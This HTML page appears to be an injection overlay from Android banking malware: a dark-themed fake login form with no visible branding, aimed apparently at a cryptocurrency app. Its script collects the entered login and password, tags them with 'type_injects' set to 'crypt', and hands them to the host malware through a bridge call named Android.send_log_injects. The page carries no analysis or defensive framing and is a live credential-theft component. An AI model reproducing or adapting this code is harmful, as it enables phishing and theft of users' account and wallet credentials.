<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <style>
        body {
            background-color: #161c28;
        }

        form {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        header {
            flex: 0.5;
        }

        section {
            padding: 40px;
        }

        .input {
            width: 100%;
            padding: 10px;
            border: 1px solid #40485a;
            border-radius: 4px;
            background-color: #1f2431;
            color: #fff;
            margin-bottom: 15px;
        }

        .button {
            width: 100%;
            padding: 10px;
            background-color: #037299;
            color: #fff;
            font-weight: 600;
            border: 0;
            border-radius: 6px;
            margin-bottom: 15px;
        }

        .error {
            border-color: #f00 !important;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }
    </style>
</head>

    <script>
        var login = document.getElementById('login'),
            password = document.getElementById('password'),
            sendData = document.getElementById('sendData');

        sendData.onclick = () => {
            if(login.value.length < 3) {
                login.classList.add('error')
            } else {
                login.classList.remove('error')
            }

            if(password.value.length < 3) {
                password.classList.add('error')
            } else {
                password.classList.remove('error')
            }

            if(login.value.length > 3 && password.value.length > 3) {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.type_injects = "crypt";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
